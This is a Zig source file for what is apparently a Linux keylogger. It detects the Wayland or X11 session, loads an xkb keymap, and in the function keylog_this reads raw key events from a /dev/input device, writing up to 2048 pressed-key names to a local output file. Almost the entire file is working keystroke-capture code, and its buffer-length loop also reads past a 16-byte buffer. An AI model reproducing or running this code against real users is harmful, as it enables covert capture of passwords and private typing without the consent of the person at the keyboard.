const std = @import("std");
const fs = std.fs;
const heap = std.heap;
const debug = std.debug;
const mem = std.mem;
const process = std.process;

const xkb = @cImport({
    @cInclude("xkbcommon/xkbcommon.h"); // -lxkbcommon
});

const cfg = @import("./config.zig");
const files = @import("./files.zig");

const XKB_Info = struct { xkb_state: *xkb.xkb_state, xkb_keymap: *xkb.xkb_keymap };

pub fn main() !void {
    var gpa = heap.GeneralPurposeAllocator(.{}){};
    defer debug.assert(gpa.deinit() == .ok);

    var arena = heap.ArenaAllocator.init(gpa.allocator());
    var allocator = arena.allocator();
    defer arena.deinit();

    const config_path = "config";
    var update_needed = false;
    var xkb_info = XKB_Info{ .xkb_state = undefined, .xkb_keymap = undefined };
    var config = cfg.Config{ .keymap = "", .event = "", .output = "" };
    cfg.read_config(config_path, &allocator, &config) catch |err| switch (err) {
        cfg.ConfigError.ConfigFileNotFound => {
            _ = try files.create_file("config");
            config.keymap = try files.create_file("keymap");
            config.event = try files.get_event_path(&allocator);
            config.output = try files.create_file("output");
            update_needed = true;
        },

        cfg.ConfigError.KeymapLineNotFound => {
            config.keymap = try files.create_file("keymap");
            config.event = try files.get_event_path(&allocator);
            config.output = try files.create_file("output.txt");
            update_needed = true;
        },

        cfg.ConfigError.EventLineNotFound => {
            config.event = try files.get_event_path(&allocator);
            config.output = try files.create_file("output.txt");
            update_needed = true;
        },

        cfg.ConfigError.OutputLineNotFound => {
            config.output = try files.create_file("output.txt");
            update_needed = true;
        },

        else => |other_err| return other_err,
    };

    var full_event = try std.fmt.allocPrint(allocator, "/dev/input/{s}", .{config.event});

    if (update_needed) {
        try cfg.update_config(config_path, config);
    }

    try update_keymap(config.keymap, &allocator, &xkb_info);

    try keylog_this(full_event, config.output, &allocator, &xkb_info);
}

// Find the keymap string and update the xkb object passed in parameters
fn update_keymap(path: []const u8, allocator: *mem.Allocator, xkb_info: *XKB_Info) !void {
    const env_map = try allocator.create(process.EnvMap);
    env_map.* = try process.getEnvMap(allocator.*);
    defer env_map.deinit();

    const xdg_session_type = env_map.get("XDG_SESSION_TYPE") orelse unreachable;
    debug.print("[+] (update_keymap) xdg_session_type : {s}\n", .{xdg_session_type});

    if (mem.eql(u8, xdg_session_type, "wayland")) {
        const wc_scanner = @import("./display-servers/wayland_module.zig");

        const keymap_file = try fs.cwd().openFile(path, fs.File.OpenFlags{ .mode = fs.File.OpenMode.write_only });
        defer keymap_file.close();

        // const writer = keymap_file.writer();
        // _ = writer;

        try wc_scanner.scan();
        debug.print("[+] (update_keymap) Wayland scan done\n", .{});

        xkb_info.xkb_keymap = wc_scanner.global_keymap;
        xkb_info.xkb_state = wc_scanner.global_state;

        return;
    } else if (mem.eql(u8, xdg_session_type, "x11")) {
        const x_scanner = @import("./display-servers/xorg_module.zig");

        const keymap_file = try fs.cwd().openFile(path, fs.File.OpenFlags{ .mode = fs.File.OpenMode.write_only });
        defer keymap_file.close();

        // const writer = keymap_file.writer();
        // _ = writer;

        try x_scanner.scan();
        debug.print("[+] (update_keymap) Xorg scan done\n", .{});

        xkb_info.xkb_keymap = @ptrCast(x_scanner.global_keymap);
        xkb_info.xkb_state = @ptrCast(x_scanner.global_state);

        return;
    }
}

// Read events from the passed event file, interpret them and then write them in the passed output file
fn keylog_this(event_path: []const u8, output_path: []const u8, allocator: *mem.Allocator, xkb_info: *XKB_Info) !void {
    const source = try fs.openFileAbsolute(event_path, fs.File.OpenFlags{});
    defer source.close();

    var in_stream = source.reader();

    const target = try fs.cwd().createFile(output_path, fs.File.CreateFlags{});
    defer target.close();

    var out_stream = target.writer();

    var n: u64 = 0;
    while (n < 2048) {
        // Read exactly 24 bytes
        var ev_array: std.BoundedArray(u8, 24) = try in_stream.readBoundedBytes(24);
        const ev_slice = ev_array.slice();

        const ev_type = mem.bytesAsSlice(c_ushort, ev_slice[16..18])[0];
        const ev_code = mem.bytesAsSlice(c_ushort, ev_slice[18..20])[0];
        const ev_value = mem.bytesAsSlice(c_uint, ev_slice[20..24])[0];

        // Type 0 is sync, can be ignored
        if (ev_type == 0) continue;

        // Type 1 with value 1 is key_pressed
        if (ev_type == 1 and ev_value == 1) {
            try print_key_name(ev_code, allocator, xkb_info, out_stream);
            n += 1;
        }
    }
}

// Use the state in xkb_info to get the symname of the passed event_code, then write it in the output stream
fn print_key_name(ev_code: u32, allocator: *mem.Allocator, xkb_info: *XKB_Info, out_stream: std.io.Writer(fs.File, std.os.WriteError, fs.File.write)) !void {
    var buf = try allocator.create([16]u8);
    defer allocator.destroy(buf);

    var sym = xkb.xkb_state_key_get_one_sym(xkb_info.xkb_state, @as(u32, ev_code) + 8);

    _ = xkb.xkb_keysym_get_name(sym, @ptrCast(buf), buf.len);
    // _ = xkb.xkb_state_key_get_utf8(xkb_info.xkb_state, @as(u32, ev_code) + 8, &buf, buf.len);

    // Compute the size of the buffer
    var size: usize = 0;
    var i: u8 = 20;
    loop: while (i > 0) {
        if (buf.*[size] == 0) {
            break :loop;
        }
        size += 1;
        i -= 1;
    }

    try out_stream.print("{s} ", .{buf.*[0..size]});
}
